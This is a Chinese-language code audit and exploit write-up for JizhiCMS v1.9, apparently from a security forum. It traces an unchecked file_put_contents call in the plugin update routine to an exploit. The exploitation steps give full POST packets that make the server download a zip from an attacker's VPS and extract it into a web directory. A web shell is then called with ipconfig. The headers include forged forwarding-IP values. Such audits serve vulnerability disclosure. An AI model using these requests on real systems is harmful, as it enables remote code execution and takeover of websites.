极致cms代码审计
=========

###### 源码地址：[https://gitee.com/Cherry\_toto/jizhicms](https://gitee.com/Cherry_toto/jizhicms)

一、审计工具：
-------

PhpStudy（2016版本）、Phpstorm（2020.3.2版本）、  
Seay源代码审计系统

二、审计步骤：
-------

### 查找关键点一：关键函数

文件操作函数：  
fopen、fclose、fputs、fwrite、readfile、file\_put\_contents、fputs、socket\_write、ftp\_nb\_get、tempnam、unl ink以及额外的（imagettftext）

### 查找关键点二：可控的参数

寻找函数里可控的参数如：fopen($\_GET\[‘filename’\],"w");  
利用上面的工具（Seay源代码审计系统）在极致cms文件中全局搜索就找到了一处file\_put\_contents函数可控的方法。如下：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-dcb03b92f407538d3d35d95dc5e0ebca89690f7e.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-dcb03b92f407538d3d35d95dc5e0ebca89690f7e.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9db64446c6c6a8ed2575d89d394eac5dc7fe5127.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9db64446c6c6a8ed2575d89d394eac5dc7fe5127.png)  
传入压缩包在926行处进行$resource = zip\_open（“payload.zip”）打开压缩包，在932行处这里是有子目录的话就继续往下打开，在934行处这里是压缩包里的全部路径（如：A/B/C.txt），往下936行处这里是以”/“进行分割目录名，如果目录不存在就会往下执行if判断并创建文件目录（权限为：0777），继续往下走就进到if判断是否为目录，如果不是就对应压缩包里的文件（如：A/B/C.txt）并以file\_put\_contents函数进行写入，简单来说这个方法并没有进行判断和过滤就直接写入了。

#### 流程：

传入压缩包 》解压压缩包 》循环创建并写入对应的压缩包内的文件数据。

### 查找关键点三：往上跟踪

全局搜索上面的方法get\_zip\_originalsize（  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-91a27ab1a598f2a8cba36fd1c7bfe69111131f78.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-91a27ab1a598f2a8cba36fd1c7bfe69111131f78.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ebbc81ffb931ae058697c9cff60c6ccf5c6c7863.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ebbc81ffb931ae058697c9cff60c6ccf5c6c7863.png)  
上面的意思是：将压缩包解压到A/exts/解压后的目录。  
而$path的值我们是已知的，$path=根目录/A/exts/。  
而$tmp\_path我们不知道它的目录在哪里，继续往上翻翻看  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a5f4cd6c266a39109779ada85eef74344f3c073d.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a5f4cd6c266a39109779ada85eef74344f3c073d.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-211793c6f9e80665f36a7b27daf3d092d739d982.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-211793c6f9e80665f36a7b27daf3d092d739d982.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-19838ff7f9c69f5f00a885636157052f5ffb011c.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-19838ff7f9c69f5f00a885636157052f5ffb011c.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-20bfeee741db5803e682d066397537c349530a7a.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-20bfeee741db5803e682d066397537c349530a7a.png)

在该方法update中的721行这里，$tmp\_path目录是cache/filepath进行控制的，而且还进行了过滤，但是对我们没任何影响。  
在745行处找到了下载文件的判断代码，如果是$action的值是”start-download“就进行下载。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-4457d0cd4bba426beba07c89aa9ecde53a1579c0.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-4457d0cd4bba426beba07c89aa9ecde53a1579c0.png)

### 查找关键点四：搜索对应页面

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8eeea22cd9a4f91ff2a0307b31e17477638dbc6a.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8eeea22cd9a4f91ff2a0307b31e17477638dbc6a.png)  
由于配置文件说明默认模板是.html的，那就搜索包start-download含html的文件  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b85bd7a7bd2cd5f67d43f49f39ab9975054b268f.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b85bd7a7bd2cd5f67d43f49f39ab9975054b268f.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-96cb070a7411d32968b5b20b5300c23abc117cc1.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-96cb070a7411d32968b5b20b5300c23abc117cc1.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c065c68d6646f79f1939654d34df7c8e817c0f4a.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c065c68d6646f79f1939654d34df7c8e817c0f4a.png)

最后简单说明：  
checkAction('Plugins/change\_status')：Plugins为控制器名，change\_status为方法名。  
在（admin.php/plugins/update.html）页面进行post传参，第一次调用start-download方法进行下载payload压缩文件，第二次进行解压payload文件到A\\exts目录下。  
Payload：

```php
action=start-download&filepath=任意文件名&download_url=vps/1.zip
```

三、影响版本：
-------

v1.9全版本

四、实现步骤：
-------

### 步骤一：后台账号权限必须拥有权限插件管理

（开启：首页/管理员管理/角色管理/角色修改）

### 步骤二：远程下载payload压缩文件

```php
action=start-download&filepath=3&download_url=http%3A%2F%2F（vps）%2F1.zip
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-67956642173c696f50f89f1cc25dfc617a83c747.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-67956642173c696f50f89f1cc25dfc617a83c747.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b17cbfb7b3891375823afc9d34bcc0ecff255317.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b17cbfb7b3891375823afc9d34bcc0ecff255317.png)

#### 数据包：

```php
POST /admin.php/Plugins/update.html HTTP/1.1
Host: 192.168.1.108
Content-Length: 80
Accept: application/json, text/j avas cript, */*; q=0.01
X-Requested-With: X MLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.108
Referer: http://192.168.1.108/admin.php/Plugins/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=g9470pcp62tg9og1a6798d3g23
x-forwarded-for: 8.8.8.8
x-originating-ip: 8.8.8.8
x-remote-ip: 8.8.8.8
x-remote-addr: 8.8.8.8
Connection: close

action=start-download&filepath=3&download_url=http%3A%2F%2F192.168.1.108%2F1.zip
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8e9cee4307ad06e15a5810e95138ee2bb89f6efc.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8e9cee4307ad06e15a5810e95138ee2bb89f6efc.png)

### 步骤三：解压payload文件

action=file-upzip&amp;filepath=3&amp;download\_url=  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ffc4c703ad1973cd45fb938fc98b9af82f7e4c4c.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ffc4c703ad1973cd45fb938fc98b9af82f7e4c4c.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-71b340364b1003b475ef009b6fff0ecb36d56de5.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-71b340364b1003b475ef009b6fff0ecb36d56de5.png)

#### 数据包：

```php
POST /admin.php/Plugins/update.html HTTP/1.1
Host: 192.168.1.108
Content-Length: 42
Accept: application/json, text/j avas cript, */*; q=0.01
X-Requested-With: X MLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.108
Referer: http://192.168.1.108/admin.php/Plugins/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=g9470pcp62tg9og1a6798d3g23
x-forwarded-for: 8.8.8.8
x-originating-ip: 8.8.8.8
x-remote-ip: 8.8.8.8
x-remote-addr: 8.8.8.8
Connection: close

action=file-upzip&filepath=3&download_url=
```

### 访问路径是：

[http://127.0.0.1//A/exts/压缩包目录/1.php?1=ipconfig](http://127.0.0.1//A/exts/%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9B%AE%E5%BD%95/1.php?1=ipconfig)  
<http://127.0.0.1//A/exts/1/1.php?1=ipconfig>  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b7b9637706704d358348d3e6561cbfe748540105.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b7b9637706704d358348d3e6561cbfe748540105.png)